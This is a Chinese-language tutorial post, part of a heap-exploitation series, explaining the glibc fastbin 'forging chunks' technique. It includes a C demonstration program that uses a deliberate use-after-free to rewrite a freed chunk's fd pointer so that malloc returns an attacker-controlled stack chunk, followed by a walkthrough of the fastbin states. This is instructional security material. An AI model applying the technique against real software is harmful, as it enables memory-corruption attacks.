---
title: "heap利用 3/9: Forging chunks"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---

# <center>Forging chunks<center>




chunk被free后，会被插入到一个bin list中。但是，指针在程序中仍然可用。如果攻击者能够控制此指针，那么它就可以修改bin中的链表结构，并插入攻击者自己伪造的chunk。下面显示的示例程序展示了fastbin freelist的情况下是如何实现forging chunk的。

**示例程序**
```C
struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

// First grab a fast chunk
a = malloc(10);               // 'a' points to 0x219c010

// Create a forged chunk
struct forged_chunk chunk;    // At address 0x7ffc6de96690
chunk.size = 0x20;            // This size should fall in the same fastbin
data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
strcpy(data, "attacker's data");

// Put the fast chunk back into fastbin
free(a);
// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;
// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10);                   // Will return 0x219c010

victim = malloc(10);          // Points to 0x7ffc6de966a0
printf("%s\n", victim);       // Prints "attacker's data" !!
```

其中，forged chunk的大小参数设置为0x20，以便通过安全检查"`malloc():memory corruption(fast)`"（该检查会检查chunk的大小是否在特定fastbin的范围内）。此外，allocated chunk的数据从"fd"指针开始。从上述程序可以显而易见，因为victim指向"forged chunk"前面的0x10（0x8 + 0x8）字节。


**相应fastbin状态变化**

不同操作后该fastbin的状态变化如下：
1. 'a' 被free.
> head->a->tail
1. 'a' 的`fd`指针被更改为指向'forged chunk'，而forged chunk的`fd`实际指向恶意代码。
> head->a->forged chunk->undefined
1. 'malloc'请求从bin中取出'a'.
> head->forged chunk->undefined
1. 用户发出'malloc'请求，forged chunk被返回给用户。
> head->underfined

**说明**
>1. 对于同一个bin list中的fast chunk的另一个'malloc'请求将导致段错误。
>2. 尽管我们请求10字节并将forged chunk的大小设置为32字节，单两者都属于fastbin的chunk大小范围内。
>3. 针对small chunks和large chunks的攻击在后面的'House of Lore'可见。
>4. 以上程序代码是为64位机器设计的。如若要在32位机器上运行，需将无符号long long替换为无符号int，因为指针将从8字节变为4字节。另外，不应该再使用32字节作为forged chunk的大小，小于17字节为好。
